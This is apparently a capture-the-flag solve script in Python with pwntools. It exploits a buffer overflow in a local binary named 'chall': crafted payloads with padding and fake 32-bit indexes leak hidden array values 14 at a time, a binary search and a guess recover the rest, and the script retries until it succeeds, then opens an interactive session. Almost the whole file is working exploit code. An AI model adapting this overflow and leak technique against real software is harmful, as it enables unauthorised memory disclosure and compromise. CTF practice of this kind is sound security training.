#!/usr/bin/env python3

from pwn import *

# bof -> can leak 14 values each time
# 14 (already known because of overwrite) + 14 * 6 = 98
# still missing 2 values (from 16 candiates)
# have to abuse [0, 1] query to binary search for 99th values
# 100th have to guess ~ 1/15

exe = ELF('./chall')
# libc = ELF('')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def ques(data):
	sl(b"?")
	sl(data)

def check(arr):
	sl(b"!")
	for i in range(len(arr)):
		sl(f"{arr[i]}".encode())

def leakarr(idx1, idx2): # max 14 value
	global arr
	global L
	global R

	# query to binary search
	payload = b"0" * (L - 1)
	mid = (L + R)//2
	payload += b"0" * (mid - L + 1)
	payload += b"1" * (R - mid)
	payload = payload.ljust(100, b"1")

	# padding
	payload += p8(0) * (0x18 + 4) # padding

	# fake index to leak 14 values
	for i in range(idx1, idx2 + 1):
		payload += p32(0x80 + 4 * i + 1)

	ques(payload[:0xB7:])

	# leak 14 values
	res = p.recvn(14)
	for i in range(len(res)):
		arr.append(res[i])

	# padding recv
	p.recvn(0x65 - 17)

	# binary search
	if(p.recvn(1) == b"0"):
		R = mid
	else:
		L = mid

	p.recvn(2)

'''
after generate
exit when wrongs
'''

script = '''
brva 0x2CFE
brva 0x2B06
'''

while(True):
	try:
		p = process('./chall')
		#p = gdb.debug('./chall', gdbscript = script)

		p.recv(b"100\n")

		(L, R) = (1, 100)
		arr = []
		leakarr(14, 27) # already known first 14 overwrite value 
		leakarr(28, 41)
		leakarr(42, 55)
		leakarr(56, 69)
		leakarr(70, 83)
		leakarr(84, 97)

		# prefix of arr from last query question
		prev = [465,     469,     473,     477,
		481,     485,     489,     493,
		497,     501,     505,     509,
		513,     517]
		arr = prev + arr

		# guess the 99th values
		# approximately 1/1 -> 1/3
		for i in range(L, R + 1):
			if(i not in arr):
				arr.append(i)
				break

		# guess the 100th values
		# 1/15
		for i in range(1, 101):
			if(i not in arr):
				arr.append(i)
				break

		check(arr)

		# padding precv
		for i in range(101):
			p.recvline()

		s = p.recvline()
		if(s[:5:] == b"Wrong"):
			raise Exception

		break

	except:
		try:
			p.close()
		except:
			pass

p.interactive()
